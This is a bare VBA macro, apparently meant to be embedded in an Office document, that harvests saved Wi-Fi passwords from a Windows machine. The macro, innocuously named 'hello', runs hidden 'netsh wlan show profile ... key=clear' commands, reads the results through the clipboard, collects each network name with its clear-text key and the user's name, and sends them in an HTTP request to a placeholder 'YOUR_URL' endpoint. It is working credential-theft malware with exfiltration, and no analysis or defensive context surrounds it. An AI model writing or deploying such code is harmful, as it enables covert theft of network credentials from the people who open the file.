Sub hello()
    Dim response As String
    Dim profiles(15) As Variant
    Dim index As Integer
    Dim count As Integer
    Dim Added As Integer
    Dim i2 As Integer
    Dim passwords(15) As Variant
    Dim postreqString As String
    
    Dim confirmer As Integer
    
    Added = 150
    count = 0
    CreateObject("WScript.Shell").Run "cmd /C netsh wlan show profiles | clip", 0, True

    'Call to see all profiles
    response = CreateObject("htmlfile").ParentWindow.ClipboardData.GetData("text")
    'Count profiles
    
    For i = 0 To 20
        index = InStr(Added, response, ":")
        If index = 0 Then
            i = 21
        End If
        If count >= 10 Then
            i = 21
        End If
        Added = index + 1
        count = count + 1
    Next i
    
    'Resetting the first index and getting the actual profiles
    
    Added = 150
    For i = 0 To count - 2
        index = InStr(Added + 2, response, ":")
        i2 = InStr(index, response, "    ")
        If i2 = 0 Then
            i2 = Len(response)
        End If
        profiles(i) = Mid(response, index, i2 - index)
        Added = index + 1
    Next i
    For i = 0 To count - 2
        profiles(i) = Right(profiles(i), Len(profiles(i)) - 2)
        profiles(i) = Left(profiles(i), Len(profiles(i)) - 2)
    Next i
    'Profiles now has the profiles, all we need to do is run (netsh wlan show profile PROF key=clear) on every profile
    'then get the output of each command get the password from the output and put it in another array
    
    For i = 0 To UBound(profiles)
        If IsEmpty(profiles(i)) Then GoTo NextIteration
        CreateObject("WScript.Shell").Run "cmd /C netsh wlan show profile " + profiles(i) + " key=clear | clip", 0, True
        response = CreateObject("htmlfile").ParentWindow.ClipboardData.GetData("text")
        confirmer = InStr(150, response, "Security key           : Present")
        If confirmer = 0 Then GoTo NextIteration
        index = InStr(150, response, "Key Content            :")
        If index = 0 Then
            i = 100
        Else
            i2 = InStr(index, response, vbNewLine)
            passwords(i) = Mid(response, index + 24, i2 - index - 24)
        End If
NextIteration:
    Next i
    'then send this array to my api
    CreateObject("WScript.Shell").Run "cmd /C echo %USERNAME% | clip", 0, True
    response = CreateObject("htmlfile").ParentWindow.ClipboardData.GetData("text")
    postreqString = ""
    For i = 0 To UBound(profiles)
        If IsEmpty(profiles(i)) Then GoTo NEXTPOINT
        profiles(i) = profiles(i) + "|       " + passwords(i)
        postreqString = postreqString + profiles(i) + ":"
NEXTPOINT:
    Next i
    Set TCRequestItem = CreateObject("WinHttp.WinHttpRequest.5.1")
    TCRequestItem.Open "Get", "https://YOUR_URL" + response + "/" + postreqString, False
    TCRequestItem.send ("")
End Sub
